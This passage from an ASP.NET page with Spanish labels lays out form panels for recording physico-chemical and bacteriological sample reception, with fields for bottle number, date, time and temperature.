					CssClass="labelInput" Width="104px">Fecha Recepci�n :</asp:label><asp:label id="Label29" style="Z-INDEX: 102; LEFT: 8px; POSITION: absolute; TOP: 4px" runat="server"
					CssClass="labelInput" Width="88px">Fisico Quimico</asp:label><INPUT class="input" id="TxtFechaRecFQ" style="Z-INDEX: 103; LEFT: 124px; WIDTH: 64px; POSITION: absolute; TOP: 76px; HEIGHT: 18px; TEXT-ALIGN: center"
					type="text" size="5" name="Text1" runat="server" tabIndex="34">
				<asp:label id="Label28" style="Z-INDEX: 104; LEFT: 28px; POSITION: absolute; TOP: 96px" runat="server"
					CssClass="labelInput" Width="92px">Hora Recepci�n :</asp:label><INPUT class="input" id="TxtHoraFQ" style="Z-INDEX: 105; LEFT: 124px; WIDTH: 64px; POSITION: absolute; TOP: 96px; HEIGHT: 18px; TEXT-ALIGN: center"
					type="text" size="5" name="Text1" runat="server" tabIndex="36">
				<asp:label id="Label27" style="Z-INDEX: 106; LEFT: 16px; POSITION: absolute; TOP: 116px" runat="server"
					CssClass="labelInput" Width="104px">Temperatura (�C) :</asp:label><INPUT class="input" id="TxtTempFQ" style="Z-INDEX: 107; LEFT: 124px; WIDTH: 64px; POSITION: absolute; TOP: 116px; HEIGHT: 18px; TEXT-ALIGN: center"
					type="text" size="5" name="Text1" runat="server" tabIndex="37">
				<SELECT class="input" id="listRecepcionFQ" style="Z-INDEX: 109; LEFT: 124px; WIDTH: 100px; POSITION: absolute; TOP: 52px"
					name="listRecepcionFQ" tabIndex="33">
					<OPTION selected></OPTION>
				</SELECT>
				<INPUT class="inputButton" id="BCalendar3" style="Z-INDEX: 110; LEFT: 204px; POSITION: absolute; TOP: 76px"
					onclick="calendarframe.fPopCalendar(this,TxtFechaRecFQ,calendar);return false;" type="button"
					value="C" name="buttonFecha" tabIndex="35">
				<asp:label id="Label32" style="Z-INDEX: 108; LEFT: 76px; POSITION: absolute; TOP: 36px" runat="server"
					CssClass="labelInput" Width="48px">Frasco :</asp:label>
				<INPUT class="input" id="txtFrascoFQ" style="Z-INDEX: 111; LEFT: 124px; WIDTH: 64px; POSITION: absolute; TOP: 32px; HEIGHT: 18px; TEXT-ALIGN: center"
					type="text" size="5" name="Text1" runat="server" tabIndex="32"> <INPUT class="inputButton" id="btnAnalisisFQ" style="Z-INDEX: 112; LEFT: 84px; WIDTH: 84px; POSITION: absolute; TOP: 140px; HEIGHT: 21px"
					onclick="verAnalisisFQ();" type="button" value="Ver An�lisis" name="btnAnalisisFQ" tabIndex="44">
			</DIV>
			<DIV class="panel" title="Bacteriol�gico" style="Z-INDEX: 136; LEFT: 232px; WIDTH: 244px; POSITION: absolute; TOP: 276px; HEIGHT: 168px"
				ms_positioning="GridLayout">
				<asp:label id="Label24" style="Z-INDEX: 100; LEFT: 36px; POSITION: absolute; TOP: 56px" runat="server"
					CssClass="labelInput" Width="40px">Recepcionista :</asp:label>
				<asp:label id="Label23" style="Z-INDEX: 101; LEFT: 20px; POSITION: absolute; TOP: 76px" runat="server"
					CssClass="labelInput" Width="100px">Fecha Recepci�n :</asp:label>
				<asp:label id="Label22" style="Z-INDEX: 102; LEFT: 8px; POSITION: absolute; TOP: 4px" runat="server"
					CssClass="labelInput" Width="88px">Bacteriol�gico </asp:label>
				<INPUT class="input" id="TxtFechaRecBac" style="Z-INDEX: 103; LEFT: 124px; WIDTH: 64px; POSITION: absolute; TOP: 76px; HEIGHT: 18px; TEXT-ALIGN: center"
					type="text" size="5" name="Text1" runat="server" tabIndex="28">
				<asp:label id="Label25" style="Z-INDEX: 104; LEFT: 28px; POSITION: absolute; TOP: 96px" runat="server"
					CssClass="labelInput" Width="92px">Hora Recepci�n :</asp:label>
				<INPUT class="input" id="TxtHoraBac" style="Z-INDEX: 105; LEFT: 124px; WIDTH: 64px; POSITION: absolute; TOP: 96px; HEIGHT: 18px; TEXT-ALIGN: center"
					type="text" size="5" name="Text1" runat="server" tabIndex="30">
				<asp:label id="Label26" style="Z-INDEX: 106; LEFT: 16px; POSITION: absolute; TOP: 116px" runat="server"
					CssClass="labelInput" Width="104px">Temperatura (�C) :</asp:label>
				<INPUT class="input" id="TxtTempBac" style="Z-INDEX: 107; LEFT: 124px; WIDTH: 64px; POSITION: absolute; TOP: 116px; HEIGHT: 18px; TEXT-ALIGN: center"
					type="text" size="5" name="Text1" runat="server" tabIndex="31">
				<SELECT class="input" id="listRecepcionBac" style="Z-INDEX: 108; LEFT: 124px; WIDTH: 100px; POSITION: absolute; TOP: 52px"
					name="listRecepcionBac" tabIndex="27">
					<OPTION selected></OPTION>
				</SELECT>
				<INPUT class="inputButton" id="BCalendar2" style="Z-INDEX: 109; LEFT: 204px; POSITION: absolute; TOP: 76px"
					onclick="calendarframe.fPopCalendar(this,TxtFechaRecBac,calendar);return false;" type="button"
					value="C" name="buttonFecha" tabIndex="29">
				<asp:label id="Label2" style="Z-INDEX: 110; LEFT: 76px; POSITION: absolute; TOP: 36px" runat="server"
					CssClass="labelInput" Width="48px">Frasco :</asp:label>
				<INPUT class="input" id="txtFrascoBac" style="Z-INDEX: 112; LEFT: 124px; WIDTH: 64px; POSITION: absolute; TOP: 32px; HEIGHT: 18px; TEXT-ALIGN: center"
					type="text" size="5" name="Text1" runat="server" tabIndex="26"> <INPUT class="inputButton" id="btnAnalisisBac" style="Z-INDEX: 144; LEFT: 80px; WIDTH: 84px; POSITION: absolute; TOP: 140px; HEIGHT: 21px"
					onclick="verAnalisisBac();" type="button" value="Ver An�lisis" name="btnAnalisisBac" tabIndex="43"></DIV>
		</form>
	</body>
</HTML>
